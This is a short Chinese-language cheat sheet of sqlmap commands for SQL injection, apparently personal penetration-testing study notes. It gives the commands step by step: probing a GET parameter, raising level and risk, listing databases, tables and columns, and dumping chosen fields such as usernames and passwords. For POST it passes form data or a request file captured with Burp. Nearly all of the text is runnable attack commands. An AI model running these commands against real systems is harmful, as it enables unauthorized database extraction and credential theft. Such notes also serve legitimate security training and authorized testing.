下面的英文参数全写时在前面需要--

简写时则一个-

--batch 工具自动N 有时需要判断是否注入，则需要手动确认

但是提高level=5,risk=3,再加--batch 工具会偏积进判断，则可以实现查询



探测注入点：GET请求

sqlmap -u "http://192.168.18.16?id=1" --batch        --batch是自动确认，无需手动回车

深度   --level=3 (1-5)   风险  --risk=2   (1-3)

1.（查询所有数据库databases）

sqlmap -u "url" -dbs --batch （查询所有数据库databases）

2.(查询当前连接的数据库)

sqlmap -u "url" --current-db --batch

3.爆指定的数据库所有表名

sqlmap -u "url"  -D ”数据库名字“  --tables --batch

4.爆指定数据库和指定表的所有字段名

sqlmap -u "url" -D ”数据库名“ -T ”表名“ --columns --batch

5.爆指定数据库指定表和指定字段下的全部数据；（这是查具体内容，需要dump,而上面只是查框架，无需dump）

sqlmap -u "url" -D ”指定数据库“ -T 指定表名 -C ”指定字段“（如username,password,多字段用逗号隔开）--dump --batch

POST请求：
sqlmap -u "http://192.168.15.1/login.php" --data="user=1&pass=2"   user=1&**pass=2**这个去请求包里复制

或者直接bp抓包，将全部数据写入文件 pp.txt

sqlmap -r pp.txt   工具会自动识别注入点